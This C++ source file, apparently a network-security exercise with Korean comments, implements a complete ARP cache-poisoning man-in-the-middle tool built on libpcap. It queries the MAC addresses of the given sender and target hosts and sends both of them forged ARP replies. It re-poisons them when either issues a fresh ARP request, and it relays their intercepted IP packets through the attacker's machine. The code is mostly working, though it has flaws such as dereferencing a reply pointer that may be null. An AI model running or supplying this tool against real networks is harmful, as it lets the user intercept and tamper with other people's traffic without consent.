#include <cstdio>
#include <pcap.h>
#include <unistd.h>

#include <iostream>     
#include <cstring>       
#include <unistd.h>      
#include <sys/ioctl.h>   
#include <net/if.h>      
#include <arpa/inet.h>  
#include <netinet/in.h> 
#include <vector>

#include "./include/ethhdr.h"
#include "./include/arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

std::string get_ip(const std::string& iface) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return "";

    struct ifreq ifr;
    std::strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ);
    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
        close(fd);
        return "";
    }
    close(fd);

    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
    return std::string(inet_ntoa(ipaddr->sin_addr));
}

std::string get_mac(const std::string& iface) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return "";

    struct ifreq ifr;
    std::strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
        close(fd);
        return "";
    }
    close(fd);

    unsigned char* mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    char mac_str[18];
    std::snprintf(mac_str, sizeof(mac_str),
        "%02x:%02x:%02x:%02x:%02x:%02x",
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return std::string(mac_str);
}

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

EthArpPacket construct_arp_req(Mac smac, Ip sip, Ip tip) {
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = smac;
	packet.arp_.sip_ = ntohl(sip);
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = ntohl(tip);

	return packet;
}	

EthArpPacket* recieve_arp_reply(pcap_t* pcap, Ip sip, Ip tip, uint16_t op) {
	for(int i = 0; i < 10; i++) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			return nullptr;
		}
		EthArpPacket* eth_arp_packet = (EthArpPacket*)packet;
		if (eth_arp_packet->eth_.type_ != htons(EthHdr::Arp)) continue; // ARP check
		if (eth_arp_packet->arp_.op_ != htons(op)) continue; // Reply check
		if (eth_arp_packet->arp_.sip_ != ntohl(sip)) continue; // sip check
		if (eth_arp_packet->arp_.tip_ != ntohl(tip)) continue; // tip check
		return eth_arp_packet;
	}
	return nullptr;
}

EthArpPacket construct_arp_reply(pcap_t* pcap, Mac my_mac, Mac sender_mac, Ip target_ip, Ip sender_ip) {
	EthArpPacket packet;

	packet.eth_.dmac_ = sender_mac;
	packet.eth_.smac_ = my_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = my_mac;
	packet.arp_.sip_ = htonl(target_ip);
	packet.arp_.tmac_ = sender_mac;
	packet.arp_.tip_ = htonl(sender_ip);

	return packet;
}

struct ArpPair {
    Ip sender_ip;
    Ip target_ip;
    Mac sender_mac;
    Mac target_mac;
    EthArpPacket sender_spoof_pkt; // sender에게 보내는 ARP reply 패킷
	EthArpPacket target_spoof_pkt; // Target에게 보내는 ARP reply 패킷
};
std::vector<ArpPair> arp_pairs;

typedef struct {
    uint8_t version_ihl;
    uint8_t type_of_service;
    uint16_t total_length;
    uint16_t id;
    uint16_t flags_offset;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t checksum;
    uint32_t src_ip;
    uint32_t dst_ip;
} IpHdr;

EthHdr*	construct_ethernet_header(uint16_t type, Mac smac, Mac dmac) {
	EthHdr* eth_hdr = new EthHdr();
	eth_hdr->smac_ = smac;
	eth_hdr->dmac_ = dmac;
	eth_hdr->type_ = htons(type);
	return eth_hdr;
}

bool send_arp_reply(pcap_t* pcap, const EthArpPacket* packet) {
	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		return false;
	}
	return true;
}

bool packet_forwarding(pcap_t* pcap, Mac src_mac, Mac my_mac, int caplen, const u_char* packet) {
	EthHdr eth_hdr;
	eth_hdr.dmac_ = src_mac;
	eth_hdr.smac_ = my_mac;
	eth_hdr.type_ = ((EthHdr*)packet)->type_;

	uint8_t forward_packet[BUFSIZ];
	memcpy(forward_packet, &eth_hdr, sizeof(EthHdr));
	memcpy(forward_packet + sizeof(EthHdr), packet + sizeof(EthHdr), caplen - sizeof(EthHdr));	

	int res = pcap_sendpacket(pcap, forward_packet, caplen);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		return false;
	}
	return true;
}

int main(int argc, char* argv[]) {
	if ((argc - 2) % 2 != 0 || argc < 4) {
		usage();
		return EXIT_FAILURE;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	//1. MyIP, MyMac, sender_ip, target_ip 설정
    std::string ip_str = get_ip(dev);
    std::string mac_str = get_mac(dev);
	Ip my_ip(ip_str);
	printf("My Ip: %s\n", std::string(my_ip).c_str());
    Mac my_mac(mac_str);
	printf("My Mac: %s\n", std::string(my_mac).c_str());

	for (int i = 2; i < argc; i += 2) {
		Ip sender_ip(argv[i]);
		Ip target_ip(argv[i + 1]);
		
		//2. ARP request
		//2-1. senderIP에 ARP request
		EthArpPacket packet1 = construct_arp_req(my_mac, my_ip, sender_ip);
		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet1), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		}
		Mac sender_mac = recieve_arp_reply(pcap, sender_ip, my_ip, ArpHdr::Reply)->arp_.smac_;
		printf("%s\n", std::string(sender_mac).c_str());
		
		//2-2. TargetIP에 ARP request
		EthArpPacket packet2 = construct_arp_req(my_mac, my_ip, target_ip);
		res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet2), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		}
		Mac target_mac = recieve_arp_reply(pcap, target_ip, my_ip, ArpHdr::Reply)->arp_.smac_;
		printf("%s\n", std::string(target_mac).c_str());
		
		EthArpPacket sender_spoof_pkt = construct_arp_reply(pcap, my_mac, sender_mac, target_ip, sender_ip);
		EthArpPacket target_spoof_pkt = construct_arp_reply(pcap, my_mac, target_mac, sender_ip, target_ip);

		//3. pair 생성
    	arp_pairs.push_back({sender_ip, target_ip, sender_mac, target_mac, sender_spoof_pkt, target_spoof_pkt});
	}

	// 4. ARP reply 패킷 일단 전송 -> 초기 설정 => 양쪽에 보내도록해야 함
	for(const auto& arp_pair: arp_pairs) {
		bool send_res = send_arp_reply(pcap, &arp_pair.sender_spoof_pkt);
		printf("Sent ARP reply to sender: %s -> %s\n", std::string(arp_pair.sender_ip).c_str(), std::string(arp_pair.target_ip).c_str());
		send_res = send_arp_reply(pcap, &arp_pair.target_spoof_pkt);
		printf("Sent ARP reply to target: %s -> %s\n", std::string(arp_pair.target_ip).c_str(), std::string(arp_pair.sender_ip).c_str());
	}

	// 5. 패킷 잡아서 조건 만족하면 해당 작업 수행 -> 반복문
	while(true){
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}
		EthHdr* eth_hdr = (EthHdr*)packet;
		IpHdr* ip_hdr = (IpHdr*)(packet + sizeof(EthHdr));
		Ip src_ip = Ip(ntohl(ip_hdr->src_ip));
		Ip dst_ip = Ip(ntohl(ip_hdr->dst_ip));

		for(const auto& arp_pair: arp_pairs){
			if(eth_hdr->type() == 0x0806) {
				EthArpPacket* eth_arp_packet = (EthArpPacket*)packet;
				if (eth_arp_packet->arp_.op_ == htons(ArpHdr::Request)) {
					if (eth_arp_packet->arp_.sip() == arp_pair.target_ip && eth_arp_packet->arp_.tip() == arp_pair.sender_ip) {
						bool res = send_arp_reply(pcap, &arp_pair.target_spoof_pkt);
						printf("Sent ARP reply to sender: %s -> %s\n", std::string(arp_pair.sender_ip).c_str(), std::string(arp_pair.target_ip).c_str());
					}
					if (eth_arp_packet->arp_.sip_ == arp_pair.sender_ip && eth_arp_packet->arp_.tip_ == arp_pair.target_ip) {
						bool res = send_arp_reply(pcap, &arp_pair.sender_spoof_pkt);
						printf("Sent ARP reply to sender: %s -> %s\n", std::string(arp_pair.sender_ip).c_str(), std::string(arp_pair.target_ip).c_str());
					}
				}			
			}

			//5-1. packet forwarding
			if(dst_ip == arp_pair.sender_ip){
				bool res = packet_forwarding(pcap, arp_pair.sender_mac, my_mac, header->caplen, packet);
				// TODO: false 처리
				printf("%s -> %s\n", std::string(src_ip).c_str(), std::string(dst_ip).c_str());
			}
			if(src_ip == arp_pair.sender_ip){
				bool res = packet_forwarding(pcap, arp_pair.target_mac, my_mac, header->caplen, packet);
				printf("%s -> %s\n", std::string(src_ip).c_str(), std::string(dst_ip).c_str());
			}
		}
	}

	pcap_close(pcap);
}